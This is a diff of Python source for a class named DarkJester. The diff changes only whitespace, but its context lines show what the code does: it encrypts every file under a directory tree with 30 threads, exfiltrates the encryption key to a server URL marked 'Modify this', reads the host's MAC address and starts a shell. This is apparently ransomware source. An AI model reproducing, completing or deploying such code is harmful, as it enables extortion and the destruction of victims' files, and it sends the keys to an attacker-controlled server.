@@ -45,7 +45,7 @@ class DarkJester:
                 for file in files:
                     filepath = os.path.join(root, file)
                     executor.submit(self.encrypt_file, filepath)
-
+    
     def get_mac_address(self):
         result = sp.run(['ip', 'addr'], capture_output=True, text=True)
         lines = result.stdout.splitlines()
@@ -136,3 +136,5 @@ if __name__ == "__main__":
     jester.encrypt_directory("path/to/directory", max_threads=30) # Modify this, adjust thread if needed
     jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
     shell.start()
+
+
